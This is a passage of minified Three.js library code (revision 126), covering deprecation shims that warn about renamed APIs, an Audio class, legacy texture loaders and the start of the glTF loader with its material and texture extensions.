this.shadow.mapSize.width = e } }, shadowMapHeight: { set: function(e) { console.warn("THREE.Light: .shadowMapHeight is now .shadow.mapSize.height."), this.shadow.mapSize.height = e } } }), Object.defineProperties(Yt.prototype, { length: { get: function() { return console.warn("THREE.BufferAttribute: .length has been deprecated. Use .count instead."), this.array.length } }, dynamic: { get: function() { return console.warn("THREE.BufferAttribute: .dynamic has been deprecated. Use .usage instead."), this.usage === ae }, set: function() { console.warn("THREE.BufferAttribute: .dynamic has been deprecated. Use .usage instead."), this.setUsage(ae) } } }), Yt.prototype.setDynamic = function(e) { return console.warn("THREE.BufferAttribute: .setDynamic() has been deprecated. Use .setUsage() instead."), this.setUsage(!0 === e ? ae : re), this }, Yt.prototype.copyIndicesArray = function() { console.error("THREE.BufferAttribute: .copyIndicesArray() has been removed.") }, Yt.prototype.setArray = function() { console.error("THREE.BufferAttribute: .setArray has been removed. Use BufferGeometry .setAttribute to replace/resize attribute buffers") }, fn.prototype.addIndex = function(e) { console.warn("THREE.BufferGeometry: .addIndex() has been renamed to .setIndex()."), this.setIndex(e) }, fn.prototype.addAttribute = function(e, t) { return console.warn("THREE.BufferGeometry: .addAttribute() has been renamed to .setAttribute()."), t && t.isBufferAttribute || t && t.isInterleavedBufferAttribute ? "index" === e ? (console.warn("THREE.BufferGeometry.addAttribute: Use .setIndex() for index attribute."), this.setIndex(t), this) : this.setAttribute(e, t) : (console.warn("THREE.BufferGeometry: .addAttribute() now expects ( name, attribute )."), this.setAttribute(e, new Yt(arguments[1], arguments[2]))) }, fn.prototype.addDrawCall = function(e, t, n) { void 0 !== n && console.warn("THREE.BufferGeometry: .addDrawCall() no longer supports indexOffset."), console.warn("THREE.BufferGeometry: .addDrawCall() is now .addGroup()."), this.addGroup(e, t) }, fn.prototype.clearDrawCalls = function() { console.warn("THREE.BufferGeometry: .clearDrawCalls() is now .clearGroups()."), this.clearGroups() }, fn.prototype.computeOffsets = function() { console.warn("THREE.BufferGeometry: .computeOffsets() has been removed.") }, fn.prototype.removeAttribute = function(e) { return console.warn("THREE.BufferGeometry: .removeAttribute() has been renamed to .deleteAttribute()."), this.deleteAttribute(e) }, fn.prototype.applyMatrix = function(e) { return console.warn("THREE.BufferGeometry: .applyMatrix() has been renamed to .applyMatrix4()."), this.applyMatrix4(e) }, Object.defineProperties(fn.prototype, { drawcalls: { get: function() { return console.error("THREE.BufferGeometry: .drawcalls has been renamed to .groups."), this.groups } }, offsets: { get: function() { return console.warn("THREE.BufferGeometry: .offsets has been renamed to .groups."), this.groups } } }), Object.defineProperties(Fo.prototype, { maxInstancedCount: { get: function() { return console.warn("THREE.InstancedBufferGeometry: .maxInstancedCount has been renamed to .instanceCount."), this.instanceCount }, set: function(e) { console.warn("THREE.InstancedBufferGeometry: .maxInstancedCount has been renamed to .instanceCount."), this.instanceCount = e } } }), Object.defineProperties(as.prototype, { linePrecision: { get: function() { return console.warn("THREE.Raycaster: .linePrecision has been deprecated. Use .params.Line.threshold instead."), this.params.Line.threshold }, set: function(e) { console.warn("THREE.Raycaster: .linePrecision has been deprecated. Use .params.Line.threshold instead."), this.params.Line.threshold = e } } }), Object.defineProperties(ia.prototype, { dynamic: { get: function() { return console.warn("THREE.InterleavedBuffer: .length has been deprecated. Use .usage instead."), this.usage === ae }, set: function(e) { console.warn("THREE.InterleavedBuffer: .length has been deprecated. Use .usage instead."), this.setUsage(e) } } }), ia.prototype.setDynamic = function(e) { return console.warn("THREE.InterleavedBuffer: .setDynamic() has been deprecated. Use .setUsage() instead."), this.setUsage(!0 === e ? ae : re), this }, ia.prototype.setArray = function() { console.error("THREE.InterleavedBuffer: .setArray has been removed. Use BufferGeometry .setAttribute to replace/resize attribute buffers") }, na.prototype.dispose = function() { console.error("THREE.Scene: .dispose() has been removed.") }, Object.defineProperties(ns.prototype, { dynamic: { set: function() { console.warn("THREE.Uniform: .dynamic has been removed. Use object.onBeforeRender() instead.") } }, onUpdate: { value: function() { return console.warn("THREE.Uniform: .onUpdate() has been removed. Use object.onBeforeRender() instead."), this } } }), Object.defineProperties(Ut.prototype, { wrapAround: { get: function() { console.warn("THREE.Material: .wrapAround has been removed.") }, set: function() { console.warn("THREE.Material: .wrapAround has been removed.") } }, overdraw: { get: function() { console.warn("THREE.Material: .overdraw has been removed.") }, set: function() { console.warn("THREE.Material: .overdraw has been removed.") } }, wrapRGB: { get: function() { return console.warn("THREE.Material: .wrapRGB has been removed."), new Wt } }, shading: { get: function() { console.error("THREE." + this.type + ": .shading has been removed. Use the boolean .flatShading instead.") }, set: function(e) { console.warn("THREE." + this.type + ": .shading has been removed. Use the boolean .flatShading instead."), this.flatShading = 1 === e } }, stencilMask: { get: function() { return console.warn("THREE." + this.type + ": .stencilMask has been removed. Use .stencilFuncMask instead."), this.stencilFuncMask }, set: function(e) { console.warn("THREE." + this.type + ": .stencilMask has been removed. Use .stencilFuncMask instead."), this.stencilFuncMask = e } } }), Object.defineProperties(qa.prototype, { metal: { get: function() { return console.warn("THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead."), !1 }, set: function() { console.warn("THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead") } } }), Object.defineProperties(ja.prototype, { transparency: { get: function() { return console.warn("THREE.MeshPhysicalMaterial: .transparency has been renamed to .transmission."), this.transmission }, set: function(e) { console.warn("THREE.MeshPhysicalMaterial: .transparency has been renamed to .transmission."), this.transmission = e } } }), Object.defineProperties(Fn.prototype, { derivatives: { get: function() { return console.warn("THREE.ShaderMaterial: .derivatives has been moved to .extensions.derivatives."), this.extensions.derivatives }, set: function(e) { console.warn("THREE. ShaderMaterial: .derivatives has been moved to .extensions.derivatives."), this.extensions.derivatives = e } } }), ta.prototype.clearTarget = function(e, t, n, i) { console.warn("THREE.WebGLRenderer: .clearTarget() has been deprecated. Use .setRenderTarget() and .clear() instead."), this.setRenderTarget(e), this.clear(t, n, i) }, ta.prototype.animate = function(e) { console.warn("THREE.WebGLRenderer: .animate() is now .setAnimationLoop()."), this.setAnimationLoop(e) }, ta.prototype.getCurrentRenderTarget = function() { return console.warn("THREE.WebGLRenderer: .getCurrentRenderTarget() is now .getRenderTarget()."), this.getRenderTarget() }, ta.prototype.getMaxAnisotropy = function() { return console.warn("THREE.WebGLRenderer: .getMaxAnisotropy() is now .capabilities.getMaxAnisotropy()."), this.capabilities.getMaxAnisotropy() }, ta.prototype.getPrecision = function() { return console.warn("THREE.WebGLRenderer: .getPrecision() is now .capabilities.precision."), this.capabilities.precision }, ta.prototype.resetGLState = function() { return console.warn("THREE.WebGLRenderer: .resetGLState() is now .state.reset()."), this.state.reset() }, ta.prototype.supportsFloatTextures = function() { return console.warn("THREE.WebGLRenderer: .supportsFloatTextures() is now .extensions.get( 'OES_texture_float' )."), this.extensions.get("OES_texture_float") }, ta.prototype.supportsHalfFloatTextures = function() { return console.warn("THREE.WebGLRenderer: .supportsHalfFloatTextures() is now .extensions.get( 'OES_texture_half_float' )."), this.extensions.get("OES_texture_half_float") }, ta.prototype.supportsStandardDerivatives = function() { return console.warn("THREE.WebGLRenderer: .supportsStandardDerivatives() is now .extensions.get( 'OES_standard_derivatives' )."), this.extensions.get("OES_standard_derivatives") }, ta.prototype.supportsCompressedTextureS3TC = function() { return console.warn("THREE.WebGLRenderer: .supportsCompressedTextureS3TC() is now .extensions.get( 'WEBGL_compressed_texture_s3tc' )."), this.extensions.get("WEBGL_compressed_texture_s3tc") }, ta.prototype.supportsCompressedTexturePVRTC = function() { return console.warn("THREE.WebGLRenderer: .supportsCompressedTexturePVRTC() is now .extensions.get( 'WEBGL_compressed_texture_pvrtc' )."), this.extensions.get("WEBGL_compressed_texture_pvrtc") }, ta.prototype.supportsBlendMinMax = function() { return console.warn("THREE.WebGLRenderer: .supportsBlendMinMax() is now .extensions.get( 'EXT_blend_minmax' )."), this.extensions.get("EXT_blend_minmax") }, ta.prototype.supportsVertexTextures = function() { return console.warn("THREE.WebGLRenderer: .supportsVertexTextures() is now .capabilities.vertexTextures."), this.capabilities.vertexTextures }, ta.prototype.supportsInstancedArrays = function() { return console.warn("THREE.WebGLRenderer: .supportsInstancedArrays() is now .extensions.get( 'ANGLE_instanced_arrays' )."), this.extensions.get("ANGLE_instanced_arrays") }, ta.prototype.enableScissorTest = function(e) { console.warn("THREE.WebGLRenderer: .enableScissorTest() is now .setScissorTest()."), this.setScissorTest(e) }, ta.prototype.initMaterial = function() { console.warn("THREE.WebGLRenderer: .initMaterial() has been removed.") }, ta.prototype.addPrePlugin = function() { console.warn("THREE.WebGLRenderer: .addPrePlugin() has been removed.") }, ta.prototype.addPostPlugin = function() { console.warn("THREE.WebGLRenderer: .addPostPlugin() has been removed.") }, ta.prototype.updateShadowMap = function() { console.warn("THREE.WebGLRenderer: .updateShadowMap() has been removed.") }, ta.prototype.setFaceCulling = function() { console.warn("THREE.WebGLRenderer: .setFaceCulling() has been removed.") }, ta.prototype.allocTextureUnit = function() { console.warn("THREE.WebGLRenderer: .allocTextureUnit() has been removed.") }, ta.prototype.setTexture = function() { console.warn("THREE.WebGLRenderer: .setTexture() has been removed.") }, ta.prototype.setTexture2D = function() { console.warn("THREE.WebGLRenderer: .setTexture2D() has been removed.") }, ta.prototype.setTextureCube = function() { console.warn("THREE.WebGLRenderer: .setTextureCube() has been removed.") }, ta.prototype.getActiveMipMapLevel = function() { return console.warn("THREE.WebGLRenderer: .getActiveMipMapLevel() is now .getActiveMipmapLevel()."), this.getActiveMipmapLevel() }, Object.defineProperties(ta.prototype, { shadowMapEnabled: { get: function() { return this.shadowMap.enabled }, set: function(e) { console.warn("THREE.WebGLRenderer: .shadowMapEnabled is now .shadowMap.enabled."), this.shadowMap.enabled = e } }, shadowMapType: { get: function() { return this.shadowMap.type }, set: function(e) { console.warn("THREE.WebGLRenderer: .shadowMapType is now .shadowMap.type."), this.shadowMap.type = e } }, shadowMapCullFace: { get: function() { console.warn("THREE.WebGLRenderer: .shadowMapCullFace has been removed. Set Material.shadowSide instead.") }, set: function() { console.warn("THREE.WebGLRenderer: .shadowMapCullFace has been removed. Set Material.shadowSide instead.") } }, context: { get: function() { return console.warn("THREE.WebGLRenderer: .context has been removed. Use .getContext() instead."), this.getContext() } }, vr: { get: function() { return console.warn("THREE.WebGLRenderer: .vr has been renamed to .xr"), this.xr } }, gammaInput: { get: function() { return console.warn("THREE.WebGLRenderer: .gammaInput has been removed. Set the encoding for textures via Texture.encoding instead."), !1 }, set: function() { console.warn("THREE.WebGLRenderer: .gammaInput has been removed. Set the encoding for textures via Texture.encoding instead.") } }, gammaOutput: { get: function() { return console.warn("THREE.WebGLRenderer: .gammaOutput has been removed. Set WebGLRenderer.outputEncoding instead."), !1 }, set: function(e) { console.warn("THREE.WebGLRenderer: .gammaOutput has been removed. Set WebGLRenderer.outputEncoding instead."), this.outputEncoding = !0 === e ? ne : te } }, toneMappingWhitePoint: { get: function() { return console.warn("THREE.WebGLRenderer: .toneMappingWhitePoint has been removed."), 1 }, set: function() { console.warn("THREE.WebGLRenderer: .toneMappingWhitePoint has been removed.") } } }), Object.defineProperties(qr.prototype, { cullFace: { get: function() { console.warn("THREE.WebGLRenderer: .shadowMap.cullFace has been removed. Set Material.shadowSide instead.") }, set: function() { console.warn("THREE.WebGLRenderer: .shadowMap.cullFace has been removed. Set Material.shadowSide instead.") } }, renderReverseSided: { get: function() { console.warn("THREE.WebGLRenderer: .shadowMap.renderReverseSided has been removed. Set Material.shadowSide instead.") }, set: function() { console.warn("THREE.WebGLRenderer: .shadowMap.renderReverseSided has been removed. Set Material.shadowSide instead.") } }, renderSingleSided: { get: function() { console.warn("THREE.WebGLRenderer: .shadowMap.renderSingleSided has been removed. Set Material.shadowSide instead.") }, set: function() { console.warn("THREE.WebGLRenderer: .shadowMap.renderSingleSided has been removed. Set Material.shadowSide instead.") } } }), Object.defineProperties(xe.prototype, { wrapS: { get: function() { return console.warn("THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS."), this.texture.wrapS }, set: function(e) { console.warn("THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS."), this.texture.wrapS = e } }, wrapT: { get: function() { return console.warn("THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT."), this.texture.wrapT }, set: function(e) { console.warn("THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT."), this.texture.wrapT = e } }, magFilter: { get: function() { return console.warn("THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter."), this.texture.magFilter }, set: function(e) { console.warn("THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter."), this.texture.magFilter = e } }, minFilter: { get: function() { return console.warn("THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter."), this.texture.minFilter }, set: function(e) { console.warn("THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter."), this.texture.minFilter = e } }, anisotropy: { get: function() { return console.warn("THREE.WebGLRenderTarget: .anisotropy is now .texture.anisotropy."), this.texture.anisotropy }, set: function(e) { console.warn("THREE.WebGLRenderTarget: .anisotropy is now .texture.anisotropy."), this.texture.anisotropy = e } }, offset: { get: function() { return console.warn("THREE.WebGLRenderTarget: .offset is now .texture.offset."), this.texture.offset }, set: function(e) { console.warn("THREE.WebGLRenderTarget: .offset is now .texture.offset."), this.texture.offset = e } }, repeat: { get: function() { return console.warn("THREE.WebGLRenderTarget: .repeat is now .texture.repeat."), this.texture.repeat }, set: function(e) { console.warn("THREE.WebGLRenderTarget: .repeat is now .texture.repeat."), this.texture.repeat = e } }, format: { get: function() { return console.warn("THREE.WebGLRenderTarget: .format is now .texture.format."), this.texture.format }, set: function(e) { console.warn("THREE.WebGLRenderTarget: .format is now .texture.format."), this.texture.format = e } }, type: { get: function() { return console.warn("THREE.WebGLRenderTarget: .type is now .texture.type."), this.texture.type }, set: function(e) { console.warn("THREE.WebGLRenderTarget: .type is now .texture.type."), this.texture.type = e } }, generateMipmaps: { get: function() { return console.warn("THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps."), this.texture.generateMipmaps }, set: function(e) { console.warn("THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps."), this.texture.generateMipmaps = e } } }), Object.defineProperties(class extends _t {
            constructor(e) { super(), this.type = "Audio", this.listener = e, this.context = e.context, this.gain = this.context.createGain(), this.gain.connect(e.getInput()), this.autoplay = !1, this.buffer = null, this.detune = 0, this.loop = !1, this.loopStart = 0, this.loopEnd = 0, this.offset = 0, this.duration = void 0, this.playbackRate = 1, this.isPlaying = !1, this.hasPlaybackControl = !0, this.source = null, this.sourceType = "empty", this._startedAt = 0, this._progress = 0, this._connected = !1, this.filters = [] }
            getOutput() { return this.gain }
            setNodeSource(e) { return this.hasPlaybackControl = !1, this.sourceType = "audioNode", this.source = e, this.connect(), this }
            setMediaElementSource(e) { return this.hasPlaybackControl = !1, this.sourceType = "mediaNode", this.source = this.context.createMediaElementSource(e), this.connect(), this }
            setMediaStreamSource(e) { return this.hasPlaybackControl = !1, this.sourceType = "mediaStreamNode", this.source = this.context.createMediaStreamSource(e), this.connect(), this }
            setBuffer(e) { return this.buffer = e, this.sourceType = "buffer", this.autoplay && this.play(), this }
            play(e = 0) {
                if (!0 === this.isPlaying) return void console.warn("THREE.Audio: Audio is already playing.");
                if (!1 === this.hasPlaybackControl) return void console.warn("THREE.Audio: this Audio has no playback control.");
                this._startedAt = this.context.currentTime + e;
                const t = this.context.createBufferSource();
                return t.buffer = this.buffer, t.loop = this.loop, t.loopStart = this.loopStart, t.loopEnd = this.loopEnd, t.onended = this.onEnded.bind(this), t.start(this._startedAt, this._progress + this.offset, this.duration), this.isPlaying = !0, this.source = t, this.setDetune(this.detune), this.setPlaybackRate(this.playbackRate), this.connect()
            }
            pause() {
                if (!1 !== this.hasPlaybackControl) return !0 === this.isPlaying && (this._progress += Math.max(this.context.currentTime - this._startedAt, 0) * this.playbackRate, !0 === this.loop && (this._progress = this._progress % (this.duration || this.buffer.duration)), this.source.stop(), this.source.onended = null, this.isPlaying = !1), this;
                console.warn("THREE.Audio: this Audio has no playback control.")
            }
            stop() {
                if (!1 !== this.hasPlaybackControl) return this._progress = 0, this.source.stop(), this.source.onended = null, this.isPlaying = !1, this;
                console.warn("THREE.Audio: this Audio has no playback control.")
            }
            connect() {
                if (this.filters.length > 0) {
                    this.source.connect(this.filters[0]);
                    for (let e = 1, t = this.filters.length; e < t; e++) this.filters[e - 1].connect(this.filters[e]);
                    this.filters[this.filters.length - 1].connect(this.getOutput())
                } else this.source.connect(this.getOutput());
                return this._connected = !0, this
            }
            disconnect() {
                if (this.filters.length > 0) {
                    this.source.disconnect(this.filters[0]);
                    for (let e = 1, t = this.filters.length; e < t; e++) this.filters[e - 1].disconnect(this.filters[e]);
                    this.filters[this.filters.length - 1].disconnect(this.getOutput())
                } else this.source.disconnect(this.getOutput());
                return this._connected = !1, this
            }
            getFilters() { return this.filters }
            setFilters(e) { return e || (e = []), !0 === this._connected ? (this.disconnect(), this.filters = e.slice(), this.connect()) : this.filters = e.slice(), this }
            setDetune(e) { if (this.detune = e, void 0 !== this.source.detune) return !0 === this.isPlaying && this.source.detune.setTargetAtTime(this.detune, this.context.currentTime, .01), this }
            getDetune() { return this.detune }
            getFilter() { return this.getFilters()[0] }
            setFilter(e) { return this.setFilters(e ? [e] : []) }
            setPlaybackRate(e) {
                if (!1 !== this.hasPlaybackControl) return this.playbackRate = e, !0 === this.isPlaying && this.source.playbackRate.setTargetAtTime(this.playbackRate, this.context.currentTime, .01), this;
                console.warn("THREE.Audio: this Audio has no playback control.")
            }
            getPlaybackRate() { return this.playbackRate }
            onEnded() { this.isPlaying = !1 }
            getLoop() { return !1 === this.hasPlaybackControl ? (console.warn("THREE.Audio: this Audio has no playback control."), !1) : this.loop }
            setLoop(e) {
                if (!1 !== this.hasPlaybackControl) return this.loop = e, !0 === this.isPlaying && (this.source.loop = this.loop), this;
                console.warn("THREE.Audio: this Audio has no playback control.")
            }
            setLoopStart(e) { return this.loopStart = e, this }
            setLoopEnd(e) { return this.loopEnd = e, this }
            getVolume() { return this.gain.gain.value }
            setVolume(e) { return this.gain.gain.setTargetAtTime(e, this.context.currentTime, .01), this }
        }.prototype, { load: { value: function(e) { console.warn("THREE.Audio: .load has been deprecated. Use THREE.AudioLoader instead."); const t = this; return (new Vo).load(e, (function(e) { t.setBuffer(e) })), this } }, startTime: { set: function() { console.warn("THREE.Audio: .startTime is now .play( delay ).") } } }), kn.prototype.updateCubeMap = function(e, t) { return console.warn("THREE.CubeCamera: .updateCubeMap() is now .update()."), this.update(e, t) }, kn.prototype.clear = function(e, t, n, i) { return console.warn("THREE.CubeCamera: .clear() is now .renderTarget.clear()."), this.renderTarget.clear(e, t, n, i) }, fe.crossOrigin = void 0, fe.loadTexture = function(e, t, n, i) {
            console.warn("THREE.ImageUtils.loadTexture has been deprecated. Use THREE.TextureLoader() instead.");
            const r = new yo;
            r.setCrossOrigin(this.crossOrigin);
            const a = r.load(e, n, void 0, i);
            return t && (a.mapping = t), a
        }, fe.loadTextureCube = function(e, t, n, i) {
            console.warn("THREE.ImageUtils.loadTextureCube has been deprecated. Use THREE.CubeTextureLoader() instead.");
            const r = new go;
            r.setCrossOrigin(this.crossOrigin);
            const a = r.load(e, n, void 0, i);
            return t && (a.mapping = t), a
        }, fe.loadCompressedTexture = function() { console.error("THREE.ImageUtils.loadCompressedTexture has been removed. Use THREE.DDSLoader instead.") }, fe.loadCompressedTextureCube = function() { console.error("THREE.ImageUtils.loadCompressedTextureCube has been removed. Use THREE.DDSLoader instead.") }, "undefined" != typeof __THREE_DEVTOOLS__ && __THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("register", { detail: { revision: "126" } })), void 0 !== window && (window.__THREE__ ? console.warn("WARNING: Multiple instances of Three.js being imported.") : window.__THREE__ = "126");
        var us = function() {
                function e(e) { uo.call(this, e), this.dracoLoader = null, this.ktx2Loader = null, this.meshoptDecoder = null, this.pluginCallbacks = [], this.register((function(e) { return new a(e) })), this.register((function(e) { return new s(e) })), this.register((function(e) { return new l(e) })), this.register((function(e) { return new o(e) })), this.register((function(e) { return new i(e) })), this.register((function(e) { return new c(e) })) }

                function t() { var e = {}; return { get: function(t) { return e[t] }, add: function(t, n) { e[t] = n }, remove: function(t) { delete e[t] }, removeAll: function() { e = {} } } }
                e.prototype = Object.assign(Object.create(uo.prototype), {
                    constructor: e,
                    load: function(e, t, n, i) {
                        var r, a = this;
                        r = "" !== this.resourcePath ? this.resourcePath : "" !== this.path ? this.path : Uo(e), this.manager.itemStart(e);
                        var o = function(t) { i ? i(t) : console.error(t), a.manager.itemError(e), a.manager.itemEnd(e) },
                            s = new po(this.manager);
                        s.setPath(this.path), s.setResponseType("arraybuffer"), s.setRequestHeader(this.requestHeader), s.setWithCredentials(this.withCredentials), s.load(e, (function(n) { try { a.parse(n, r, (function(n) { t(n), a.manager.itemEnd(e) }), o) } catch (e) { o(e) } }), n, o)
                    },
                    setDRACOLoader: function(e) { return this.dracoLoader = e, this },
                    setDDSLoader: function() { throw new Error('THREE.GLTFLoader: "MSFT_texture_dds" no longer supported. Please update to "KHR_texture_basisu".') },
                    setKTX2Loader: function(e) { return this.ktx2Loader = e, this },
                    setMeshoptDecoder: function(e) { return this.meshoptDecoder = e, this },
                    register: function(e) { return -1 === this.pluginCallbacks.indexOf(e) && this.pluginCallbacks.push(e), this },
                    unregister: function(e) { return -1 !== this.pluginCallbacks.indexOf(e) && this.pluginCallbacks.splice(this.pluginCallbacks.indexOf(e), 1), this },
                    parse: function(e, t, i, a) {
                        var o, s = {},
                            l = {};
                        if ("string" == typeof e) o = e;
                        else if (Ho(new Uint8Array(e, 0, 4)) === u) {
                            try { s[n.KHR_BINARY_GLTF] = new p(e) } catch (e) { return void(a && a(e)) }
                            o = s[n.KHR_BINARY_GLTF].content
                        } else o = Ho(new Uint8Array(e));
                        var c = JSON.parse(o);
                        if (void 0 === c.asset || c.asset.version[0] < 2) a && a(new Error("THREE.GLTFLoader: Unsupported asset. glTF versions >=2.0 are supported."));
                        else {
                            var h = new K(c, { path: t || this.resourcePath || "", crossOrigin: this.crossOrigin, requestHeader: this.requestHeader, manager: this.manager, ktx2Loader: this.ktx2Loader, meshoptDecoder: this.meshoptDecoder });
                            h.fileLoader.setRequestHeader(this.requestHeader);
                            for (var d = 0; d < this.pluginCallbacks.length; d++) {
                                var g = this.pluginCallbacks[d](h);
                                l[g.name] = g, s[g.name] = !0
                            }
                            if (c.extensionsUsed)
                                for (d = 0; d < c.extensionsUsed.length; ++d) {
                                    var x = c.extensionsUsed[d],
                                        _ = c.extensionsRequired || [];
                                    switch (x) {
                                        case n.KHR_MATERIALS_UNLIT:
                                            s[x] = new r;
                                            break;
                                        case n.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS:
                                            s[x] = new v;
                                            break;
                                        case n.KHR_DRACO_MESH_COMPRESSION:
                                            s[x] = new f(c, this.dracoLoader);
                                            break;
                                        case n.KHR_TEXTURE_TRANSFORM:
                                            s[x] = new m;
                                            break;
                                        case n.KHR_MESH_QUANTIZATION:
                                            s[x] = new y;
                                            break;
                                        default:
                                            _.indexOf(x) >= 0 && void 0 === l[x] && console.warn('THREE.GLTFLoader: Unknown extension "' + x + '".')
                                    }
                                }
                            h.setExtensions(s), h.setPlugins(l), h.parse(i, a)
                        }
                    }
                });
                var n = { KHR_BINARY_GLTF: "KHR_binary_glTF", KHR_DRACO_MESH_COMPRESSION: "KHR_draco_mesh_compression", KHR_LIGHTS_PUNCTUAL: "KHR_lights_punctual", KHR_MATERIALS_CLEARCOAT: "KHR_materials_clearcoat", KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS: "KHR_materials_pbrSpecularGlossiness", KHR_MATERIALS_TRANSMISSION: "KHR_materials_transmission", KHR_MATERIALS_UNLIT: "KHR_materials_unlit", KHR_TEXTURE_BASISU: "KHR_texture_basisu", KHR_TEXTURE_TRANSFORM: "KHR_texture_transform", KHR_MESH_QUANTIZATION: "KHR_mesh_quantization", EXT_TEXTURE_WEBP: "EXT_texture_webp", EXT_MESHOPT_COMPRESSION: "EXT_meshopt_compression" };

                function i(e) { this.parser = e, this.name = n.KHR_LIGHTS_PUNCTUAL, this.cache = { refs: {}, uses: {} } }

                function r() { this.name = n.KHR_MATERIALS_UNLIT }

                function a(e) { this.parser = e, this.name = n.KHR_MATERIALS_CLEARCOAT }

                function o(e) { this.parser = e, this.name = n.KHR_MATERIALS_TRANSMISSION }

                function s(e) { this.parser = e, this.name = n.KHR_TEXTURE_BASISU }

                function l(e) { this.parser = e, this.name = n.EXT_TEXTURE_WEBP, this.isSupported = null }

                function c(e) { this.name = n.EXT_MESHOPT_COMPRESSION, this.parser = e }
                i.prototype._markDefs = function() {
                    for (var e = this.parser, t = this.parser.json.nodes || [], n = 0, i = t.length; n < i; n++) {
                        var r = t[n];
                        r.extensions && r.extensions[this.name] && void 0 !== r.extensions[this.name].light && e._addNodeRef(this.cache, r.extensions[this.name].light)
                    }
                }, i.prototype._loadLight = function(e) {
                    var t = this.parser,
                        n = "light:" + e,
                        i = t.cache.get(n);
                    if (i) return i;
                    var r, a = t.json,
                        o = ((a.extensions && a.extensions[this.name] || {}).lights || [])[e],
                        s = new Wt(16777215);
                    void 0 !== o.color && s.fromArray(o.color);
                    var l = void 0 !== o.range ? o.range : 0;
                    switch (o.type) {
                        case "directional":
                            (r = new Io(s)).target.position.set(0, 0, -1), r.add(r.target);
                            break;
                        case "point":
                            (r = new Co(s)).distance = l;
                            break;
                        case "spot":
                            (r = new So(s)).distance = l, o.spot = o.spot || {}, o.spot.innerConeAngle = void 0 !== o.spot.innerConeAngle ? o.spot.innerConeAngle : 0, o.spot.outerConeAngle = void 0 !== o.spot.outerConeAngle ? o.spot.outerConeAngle : Math.PI / 4, r.angle = o.spot.outerConeAngle, r.penumbra = 1 - o.spot.innerConeAngle / o.spot.outerConeAngle, r.target.position.set(0, 0, -1), r.add(r.target);
                            break;
                        default:
                            throw new Error("THREE.GLTFLoader: Unexpected light type: " + o.type)
                    }
                    return r.position.set(0, 0, 0), r.decay = 2, void 0 !== o.intensity && (r.intensity = o.intensity), r.name = t.createUniqueName(o.name || "light_" + e), i = Promise.resolve(r), t.cache.add(n, i), i
                }, i.prototype.createNodeAttachment = function(e) {
                    var t = this,
                        n = this.parser,
                        i = n.json.nodes[e],
                        r = (i.extensions && i.extensions[this.name] || {}).light;
                    return void 0 === r ? null : this._loadLight(r).then((function(e) { return n._getNodeRef(t.cache, r, e) }))
                }, r.prototype.getMaterialType = function() { return jt }, r.prototype.extendParams = function(e, t, n) {
                    var i = [];
                    e.color = new Wt(1, 1, 1), e.opacity = 1;
                    var r = t.pbrMetallicRoughness;
                    if (r) {
                        if (Array.isArray(r.baseColorFactor)) {
                            var a = r.baseColorFactor;
                            e.color.fromArray(a), e.opacity = a[3]
                        }
                        void 0 !== r.baseColorTexture && i.push(n.assignTexture(e, "map", r.baseColorTexture))
                    }
                    return Promise.all(i)
                }, a.prototype.getMaterialType = function(e) { var t = this.parser.json.materials[e]; return t.extensions && t.extensions[this.name] ? ja : null }, a.prototype.extendMaterialParams = function(e, t) {
                    var n = this.parser,
                        i = n.json.materials[e];
                    if (!i.extensions || !i.extensions[this.name]) return Promise.resolve();
                    var r = [],
                        a = i.extensions[this.name];
                    if (void 0 !== a.clearcoatFactor && (t.clearcoat = a.clearcoatFactor), void 0 !== a.clearcoatTexture && r.push(n.assignTexture(t, "clearcoatMap", a.clearcoatTexture)), void 0 !== a.clearcoatRoughnessFactor && (t.clearcoatRoughness = a.clearcoatRoughnessFactor), void 0 !== a.clearcoatRoughnessTexture && r.push(n.assignTexture(t, "clearcoatRoughnessMap", a.clearcoatRoughnessTexture)), void 0 !== a.clearcoatNormalTexture && (r.push(n.assignTexture(t, "clearcoatNormalMap", a.clearcoatNormalTexture)), void 0 !== a.clearcoatNormalTexture.scale)) {
                        var o = a.clearcoatNormalTexture.scale;
                        t.clearcoatNormalScale = new he(o, -o)
                    }
                    return Promise.all(r)
                }, o.prototype.getMaterialType = function(e) { var t = this.parser.json.materials[e]; return t.extensions && t.extensions[this.name] ? ja : null }, o.prototype.extendMaterialParams = function(e, t) {
                    var n = this.parser,
                        i = n.json.materials[e];
                    if (!i.extensions || !i.extensions[this.name]) return Promise.resolve();
                    var r = [],
                        a = i.extensions[this.name];
                    return void 0 !== a.transmissionFactor && (t.transmission = a.transmissionFactor), void 0 !== a.transmissionTexture && r.push(n.assignTexture(t, "transmissionMap", a.transmissionTexture)), Promise.all(r)
                }, s.prototype.loadTexture = function(e) {
                    var t = this.parser,
                        n = t.json,
                        i = n.textures[e];
                    if (!i.extensions || !i.extensions[this.name]) return null;
                    var r = i.extensions[this.name],
                        a = n.images[r.source],
                        o = t.options.ktx2Loader;
                    if (!o) { if (n.extensionsRequired && n.extensionsRequired.indexOf(this.name) >= 0) throw new Error("THREE.GLTFLoader: setKTX2Loader must be called before loading KTX2 textures"); return null }
                    return t.loadTextureImage(e, a, o)
                }, l.prototype.loadTexture = function(e) {
                    var t = this.name,
                        n = this.parser,
                        i = n.json,
                        r = i.textures[e];
                    if (!r.extensions || !r.extensions[t]) return null;
                    var a = r.extensions[t],
                        o = i.images[a.source],
                        s = n.textureLoader;
                    if (o.uri) {
                        var l = n.options.manager.getHandler(o.uri);
                        null !== l && (s = l)
                    }
                    return this.detectSupport().then((function(r) { if (r) return n.loadTextureImage(e, o, s); if (i.extensionsRequired && i.extensionsRequired.indexOf(t) >= 0) throw new Error("THREE.GLTFLoader: WebP required by asset but unsupported."); return n.loadTexture(e) }))
                }, l.prototype.detectSupport = function() {
                    return this.isSupported || (this.isSupported = new Promise((function(e) {
